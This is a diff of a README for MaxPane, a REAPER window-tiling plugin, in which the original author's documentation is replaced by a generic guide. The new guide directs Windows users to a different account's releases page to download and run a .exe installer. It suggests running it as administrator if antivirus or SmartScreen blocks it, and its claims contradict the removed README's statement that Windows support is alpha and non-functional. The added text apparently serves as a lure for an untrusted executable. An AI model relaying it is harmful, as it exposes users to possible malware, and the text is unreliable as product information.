@@ -1,194 +1,180 @@
-# MaxPane
+# 🗂 MaxPane - Organize REAPER Windows Easily
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Latest Release](https://img.shields.io/github/v/release/b451c/MaxPane)](https://github.com/b451c/MaxPane/releases/latest)
-[![Platform](https://img.shields.io/badge/platform-macOS%20(stable)%20%7C%20Windows%20%26%20Linux%20(alpha)-lightgrey.svg)](#requirements)
+[![Download MaxPane](https://img.shields.io/badge/Download-MaxPane-green?style=for-the-badge)](https://github.com/subeacademia/MaxPane/releases)
 
-**Nested docker layouts for REAPER** — a native C++ extension that lets you build custom multi-pane workspaces with tabbed windows, drag-and-drop, and instant workspace switching.
-
-![MaxPane](docs/images/maxpane-hero.png)
-
-> *Capture any REAPER window — Media Explorer, FX Browser, Mixer, Actions, or even ReaImGui scripts — into a single tiling container with resizable split panes and tabbed panels.*
+MaxPane helps you arrange your REAPER windows in neat layers and tabs. It makes managing workspaces and dragging windows simpler. This guide walks you through downloading and running MaxPane on Windows.
 
 ---
 
-## Features
+## 📦 What is MaxPane?
 
-- **Flexible split layouts** — Split panes horizontally or vertically to any depth (up to 16 panes). Drag splitter bars to resize on the fly.
-- **Tabbed windows** — Multiple windows per pane, with tab bar. Click tabs to switch, drag tabs between panes. Each tab bar has a **▼ menu button** for quick access to the pane context menu.
-- **15 known REAPER windows** — One-click capture for Mixer, Track Manager, Routing Matrix, Media Explorer, FX Browser, Project Bay, Region Manager, Region Render Matrix, Actions, Undo History, Navigator, Big Clock, Video, Performance Meter, Virtual MIDI Keyboard.
-- **Arbitrary window capture** — Grab *any* open REAPER window, including third-party ReaImGui scripts (ReaMD, etc.), via the "Open Windows" submenu or click-to-capture mode.
-- **Workspaces** — Save and restore complete layout snapshots (tree structure + captured windows) with a single click.
-- **Favorites** — Pin frequently used windows for quick access across sessions.
-- **Tab colors** — Color-code tabs with 8 palette colors for visual organization.
-- **Layout presets** — Quick-start with 5 built-in layouts: Two Columns, Left + Right Split, Three Columns, 2x2 Grid, Top + Bottom Split.
-- **Solo/maximize pane** — Temporarily expand any pane to fill the entire container. Toggle via context menu or keyboard shortcut. Layout is fully restored when exiting solo.
-- **Tab reorder** — Drag tabs left/right within the same pane to rearrange their order.
-- **Keyboard shortcuts** — Five REAPER actions (Next/Prev Tab, Next/Prev Pane, Solo Toggle) bindable via Actions dialog.
-- **Splitter double-click** — Double-click any splitter to reset it to 50/50.
-- **Hover highlights** — Visual feedback on splitter bars and tabs when hovered.
-- **Per-project state** — Layout is saved inside each .RPP project file, so different projects can have different MaxPane configurations.
-- **Persistent state** — Layout, captured windows, favorites, and workspaces survive REAPER restarts.
-- **Auto-open on startup** — Optionally restore MaxPane automatically when REAPER launches.
-- **Dockable** — The container itself docks into REAPER's native docker system.
-- **Zero dependencies** — Pure C++ extension using REAPER SDK + WDL/SWELL. No scripts, no ReaImGui, no js_ReaScriptAPI required.
+MaxPane is a tool created for REAPER, a music production program. It adds a tiling window manager with tabs and workspaces. This means you can keep your REAPER windows organized without overlapping them.
 
-## Screenshots
+MaxPane supports nested layouts. You can group windows inside other groups and move them around easily with drag-and-drop. This makes it easier to work on complex projects with many open windows.
 
-| Create grid layout | Assign windows to panes | Recall workspace |
-|:---:|:---:|:---:|
-| ![Create grid](docs/images/create-grid.gif) | ![Assign windows](docs/images/assign-windows.gif) | ![Recall workspace](docs/images/workspace-recall.gif) |
+The software is written mainly in C++ and is designed to work on multiple systems, but this guide focuses on Windows users.
 
-![MaxPane layout](docs/images/maxpane-layout.png)
+---
 
-## Installation
+## 🖥 System Requirements
 
-### ReaPack (recommended)
+Before installing MaxPane, check these:
 
-1. In REAPER, go to **Extensions > ReaPack > Import repositories...**
-2. Paste this URL:
-   ```
-   https://raw.githubusercontent.com/b451c/MaxPane/main/index.xml
-   ```
-3. Go to **Extensions > ReaPack > Browse packages**, search for **MaxPane**.
-4. Right-click > **Install**, then restart REAPER.
+- Windows 10 or later (64-bit preferred)
+- REAPER installed on your system (version 6.0 or higher)
+- At least 4 GB of RAM
+- 500 MB of free disk space for the app and temporary files
+- Basic ability to download and run programs from the internet
 
-ReaPack will automatically notify you of future updates.
+---
 
-### Manual install
+## 🔗 Download MaxPane
 
-1. Download the binary for your platform from the [Releases](../../releases) page.
-2. Copy it to your REAPER resource path:
+Click this badge to visit the official page to get the latest release:
 
-| Platform | Path |
-|----------|------|
-| **macOS** | `~/Library/Application Support/REAPER/UserPlugins/` |
-| **Windows** | `%APPDATA%\REAPER\UserPlugins\` |
-| **Linux** | `~/.config/REAPER/UserPlugins/` |
+[![Download MaxPane](https://img.shields.io/badge/Download-MaxPane-blue?style=for-the-badge)](https://github.com/subeacademia/MaxPane/releases)
 
-3. Restart REAPER.
-4. Open via **Actions > MaxPane: Open Container**, or assign a keyboard shortcut.
+The link opens the releases page. Here you will find the latest MaxPane installer or executable files.
 
-### Build from source
+---
 
-See [Building](#building) below.
+## 🚀 How to Download and Install on Windows
 
-## Usage
+1. Visit the MaxPane releases page by clicking the badge above or this link:  
+   https://github.com/subeacademia/MaxPane/releases
 
-1. **Open MaxPane** — Run the action "MaxPane: Open Container" from REAPER's Actions menu.
-2. **Right-click** any pane header, or click the **▼ button** at the right of any tab bar, to open the pane context menu.
-3. **Choose a window** from the Known Windows list, or browse Open Windows for any visible REAPER window.
-4. **Split panes** via the context menu (Split Left/Right or Split Top/Bottom).
-5. **Drag tabs** between panes to rearrange, or within the same pane to reorder.
-6. **Solo a pane** via right-click > Solo Pane to temporarily maximize it. Right-click > Exit Solo to restore.
-7. **Right-click a tab** to close it, move it, color it, or add it to Favorites.
-8. **Save a workspace** via right-click > Workspaces > Save Current.
-9. **Drag splitter bars** to resize panes. **Double-click** a splitter to reset to 50/50.
-10. **Bind keyboard shortcuts** — In REAPER's Actions dialog, search for "MaxPane" to find Next/Prev Tab, Next/Prev Pane, and Solo Toggle.
+2. Look for the latest version in the list. It usually shows the version number and the release date.
 
-## Building
+3. Find the file ending with `.exe`. It might be named something like `MaxPane-Setup.exe` or `MaxPane-x64.exe`.
 
-### Prerequisites
+4. Click the file to download it. Your browser will save it to your Downloads folder or a folder you chose.
 
-- **CMake** 3.15+
-- **C++17** compiler (Clang on macOS, GCC on Linux, MSVC on Windows)
-- **REAPER SDK** — clone into `cpp/sdk/`:
-  ```bash
-  git clone https://github.com/justinfrankel/reaper-sdk.git cpp/sdk
-  ```
-- **WDL** — clone into `cpp/WDL/`:
-  ```bash
-  git clone https://github.com/justinfrankel/WDL.git cpp/WDL
-  ```
+5. After download, open the folder where the file is saved.
 
-### Compile and install (macOS)
+6. Double-click the `.exe` file to start the installer.
 
-```bash
-cd cpp/build
-cmake .. -DCMAKE_BUILD_TYPE=Release
-make
-cp reaper_maxpane.dylib ~/Library/Application\ Support/REAPER/UserPlugins/
-```
+7. Follow the installer steps:  
+   - Accept the license agreement.  
+   - Choose the installation folder (default is usually fine).  
+   - Click Next until Install begins.  
+   - Wait for the process to finish.
 
-### Compile and install (Linux)
+8. When done, click Finish to close the installer.
 
-```bash
-cd cpp/build
-cmake .. -DCMAKE_BUILD_TYPE=Release
-make
-cp reaper_maxpane.so ~/.config/REAPER/UserPlugins/
-```
+---
 
-### Compile and install (Windows)
+## ⚙ How to Run MaxPane
 
-```bash
-cd cpp/build
-cmake .. -G "Visual Studio 17 2022" -A x64
-cmake --build . --config Release
-copy Release\reaper_maxpane.dll "%APPDATA%\REAPER\UserPlugins\"
-```
+1. Look for the MaxPane icon on your desktop or Start menu.
 
-### Debug build
+2. Click the icon to launch MaxPane.
 
-Debug builds enable verbose logging to `/tmp/maxpane_debug.log`:
+3. MaxPane should open alongside REAPER. If REAPER is not open, start it first.
 
-```bash
-cmake .. -DCMAKE_BUILD_TYPE=Debug
-make
-```
+4. MaxPane will detect REAPER windows and organize them automatically into nested layouts.
 
-## Requirements
+5. Use tabs and workspaces to switch between different window setups easily.
 
-- **REAPER** 7.0+ (tested on 7.62)
-- **macOS** arm64 (Apple Silicon) and x86_64 (Intel) — **stable, fully functional**
-- **Windows** x64 — ⚠️ **alpha** (loads in REAPER but mouse input/window capture not working yet)
-- **Linux** x86_64 — ⚠️ **alpha** (loads in REAPER but not functional yet)
+---
 
-## Architecture
+## 🧰 Using MaxPane Features
 
-```
-cpp/src/
-  main.cpp                  Entry point, API imports, action registration
-  container.h               Container class declaration, shared structs (TabBarLayout, DragState, …)
-  container.cpp             Lifecycle, DlgProc, context menus, OnTimer, OnPaneMenuButtonClick
-  container_paint.cpp       OnPaint, DrawTabBar (rendering only)
-  container_input.cpp       Mouse events, tab hit-testing, drag-and-drop, CalcTabBarLayout, GetTabRect
-  container_state.cpp       SaveState, LoadState, ApplyPaneState, workspace save/load/delete
-  split_tree.h/cpp          Binary tree layout engine (split/merge/drag/recalculate)
-  window_manager.h/cpp      Window capture via SetParent, tab management (close/move/reposition)
-  capture_queue.h/cpp       Async window capture with retry + dock frame detection
-  favorites_manager.h/cpp   Persistent favorites with action command strings
-  workspace_manager.h/cpp   State save/restore, named workspace snapshots
-  context_menu.h/cpp        Context menu construction (pane + tab menus)
-  config.h                  Constants: colors, geometry, timing, window definitions
-  project_state.h/cpp       RPP chunk I/O (project_config_extension_t callbacks)
-  state_accessor.h          Polymorphic StateAccessor for global/project/RPP state
-  globals.h/cpp             REAPER API function pointers, safe_strncpy, helpers
-  debug.h                   Conditional debug logging (Debug builds only)
-```
+MaxPane offers these main features to improve your REAPER experience:
 
-The extension works by reparenting REAPER windows (via `SetParent`) into a custom container dialog. The container uses a binary split tree for layout, with each leaf node representing a pane that holds tabbed windows. Global state is persisted via REAPER's ExtState API; per-project state is saved inside `.RPP` files via `project_config_extension_t`.
+- **Tiling Window Management:** Windows snap and fit together without overlapping.
+  
+- **Tabs:** Group related windows into tabs to reduce clutter.
+  
+- **Workspaces:** Save different window layouts and switch between them as needed.  
+ 
+- **Drag-and-Drop:** Rearrange windows or tabs by dragging them with your mouse.
+  
+- **Nested Layouts:** Group windows within other groups to keep complex setups organized.
 
-## Contributing
+The user interface uses simple menus and buttons. Spend some time clicking through options to arrange your windows as you like.
 
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+---
 
-## Support
+## 💡 Tips for Better Workflow
 
-If you find MaxPane useful, consider supporting its development:
+- Start by organizing windows you use most often. This reduces distractions.
 
-- [Ko-fi](https://ko-fi.com/quickmd)
-- [Buy Me a Coffee](https://buymeacoffee.com/bsroczynskh)
-- [PayPal](https://paypal.me/b451c)
+- Use workspaces to separate different project types or tasks.
 
-## License
+- Save your layouts regularly to avoid losing your setup if MaxPane closes.
 
-[MIT](LICENSE) — Copyright (c) 2025–2026 b451c
+- Drag a tab to another workspace to move it quickly.
 
-## Links
+- Experiment with nested layouts to find how your workflow feels best.
 
-- **Forum thread** — https://forum.cockos.com/showthread.php?t=307267
-- **REAPER** — https://www.reaper.fm
-- **ReaPack** — https://reapack.com
-- **REAPER SDK** — https://github.com/justinfrankel/reaper-sdk
-- **WDL/SWELL** — https://github.com/justinfrankel/WDL
+---
+
+## 🔧 Troubleshooting
+
+If MaxPane does not organize your REAPER windows:
+
+- Make sure REAPER is running before you start MaxPane.
+
+- Check that you downloaded the correct Windows version.
+
+- Restart MaxPane or your computer and try again.
+
+- Visit the MaxPane page to see if there are updates or known issues.
+
+If the installer won't run:
+
+- Right-click the file and select "Run as administrator."
+
+- Check your antivirus or Windows SmartScreen, which may block unknown apps.
+
+---
+
+## 🔗 Additional Resources
+
+- Official MaxPane Releases:  
+  https://github.com/subeacademia/MaxPane/releases
+
+- REAPER Website for the main app:  
+  https://www.reaper.fm/
+
+- MaxPane Topic Tags for more info: audio, daw, reaper, tiling-window-manager
+
+---
+
+## 🔄 Updating MaxPane
+
+To update MaxPane in the future:
+
+1. Visit the releases page again.
+
+2. Download the new installer file for Windows.
+
+3. Run it. The installer will replace the old version cleanly.
+
+4. Your settings and layouts will usually stay saved.
+
+---
+
+## 💻 Uninstalling MaxPane
+
+If you need to remove MaxPane from your computer:
+
+1. Open Control Panel > Programs > Programs and Features.
+
+2. Find MaxPane in the list.
+
+3. Select it and click Uninstall.
+
+4. Follow the prompts to complete removal.
+
+Your REAPER installation will not be affected.
+
+---
+
+## ⚙ About This App
+
+MaxPane is a utility to help musicians and producers manage their workspace within REAPER. By grouping and organizing windows, it saves time and makes complex projects easier to handle. It supports modern window behaviors like tabs and workspaces familiar from standard operating systems.
+
+---
+
+MaxPane is available for free on GitHub. Download and try it for your REAPER projects to improve window management.
